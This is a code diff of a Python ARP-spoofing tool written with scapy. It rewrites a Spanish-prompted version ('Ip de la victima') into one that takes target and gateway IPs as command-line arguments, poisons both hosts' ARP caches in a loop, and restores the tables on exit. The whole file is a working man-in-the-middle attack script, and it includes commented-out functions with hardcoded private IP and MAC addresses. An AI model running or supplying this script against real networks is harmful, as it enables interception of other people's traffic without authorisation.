@@ -1,43 +1,77 @@
-#!/user/bin/env python
-
 import scapy.all as scapy
-import subprocess
 import time
-  
-def mac(ip):
-    arp_request = scapy.ARP(pdst = ip)
-    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
-    return answered_list[0][1].hwsrc
-  
-def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = mac(target_ip), psrc = spoof_ip)
-    subprocess.check_output(["echo"," 1 > /proc/sys/net/ipv4/ip_forward"])
-    print(packet.show()) 
-    scapy.send(packet)
-  
+import argparse
+
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
+    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
+    options = parser.parse_args()
+    if not options.target_ip:
+        #Code to handle if an IP Address of the target is not specified.
+        parser.error("[-] Please specify an IP Address of the target machine, use --help for more info.")
+    elif not options.gateway_ip:
+        #Code to handle if an IP Address of the gateway is not specified.
+        parser.error("[-] Please specify an IP Address of the gateway, use --help for more info.")
+    return options
+
+def get_mac(ip):
+	arp_request = scapy.ARP(pdst=ip)
+	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+	arp_request_broadcast = broadcast/arp_request
+	answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose = False,iface="eth0")[0]
+	if answered_list:
+		return answered_list[0][1].hwsrc	
+	
+def spoof(targetIp, spoofIp):
+	packet = scapy.ARP(op= 2, pdst=targetIp, hwdst=get_mac(targetIp), psrc = spoofIp)
+	scapy.send(packet,verbose = False)
+	print(packet.summary())
+	
+def restore(source_ip, destination_ip):
+    source_mac = get_mac(source_ip)
+    destination_mac = get_mac(destination_ip)
+    restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
+    scapy.send(restore_packet, count =1, verbose = False)
+
+options = get_args()
+
+target_ip = options.target_ip
+gateway_ip = options.gateway_ip
+
+#def spoofME():
+#	packet = scapy.ARP(op= 2, pdst="192.168.1.254", hwdst="cc:35:40:96:29:ee", psrc = "192.168.1.57", hwsrc = "DC:FB:48:66:7D:F8")
+#	scapy.send(packet,verbose = False)
+#	print(packet.summary())
+	
+#def spoofWI():
+#	packet = scapy.ARP(op= 2, pdst="192.168.1.57", hwdst="DC:FB:48:66:7D:F8", psrc = "192.168.1.254", hwsrc = "cc:35:40:96:29:ee")
+#	scapy.send(packet,verbose = False)
+#	print(packet.summary())
+	
+#print("Digite la ip de la maquina: ")
+#ipClient = input()
+#print("Digite la ip de la gateway: ")
+#ipGateway = input()
+sent_packets_count = 0
+
 try:
-    sent_packets_count = 0
-    print("Ip de la victima")
-    victima = input ()
-    print("Geteway")
-    gateway = input ()
-    print("Tiempo ejecución")
-    timec = input ()
-    timefin = float(timec) * 60
-    tiempoej = 0
-    myStart = time.time()
-    while tiempoej <= timefin:
-        print("1 Victima "+str(victima)+" Hacker "+str(gateway))
-        spoof(victima, gateway)
-        print("2 Hacker "+str(gateway)+" Victima "+str(victima))
-        spoof(gateway, victima)
-        tiempoej = time.time() - myStart
-        print("total time taken this loop: "+str(tiempoej)+ " Inicio: "+str(myStart)+" Actual: "+str(time.time()))
-        sent_packets_count = sent_packets_count + 2
-        print("\r[+] Packets Sent: "+str(sent_packets_count))
-        time.sleep(2) # Waits for two seconds
-  
+	while sent_packets_count <= 30:
+	    spoof(gateway_ip,target_ip)
+	    spoof(target_ip,gateway_ip)
+	    sent_packets_count = sent_packets_count + 2
+	    print("[+] Packets sent: " + str(sent_packets_count))
+	    time.sleep(2)
+	print("\n[-]  Restoring the ARP Tables..... Be Patient")
+	restore(target_ip, gateway_ip)
+	restore(gateway_ip, target_ip)
 except KeyboardInterrupt:
-    print("Arp Spoof Finalizo")
+    print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    
+
+		
+		
+	
+
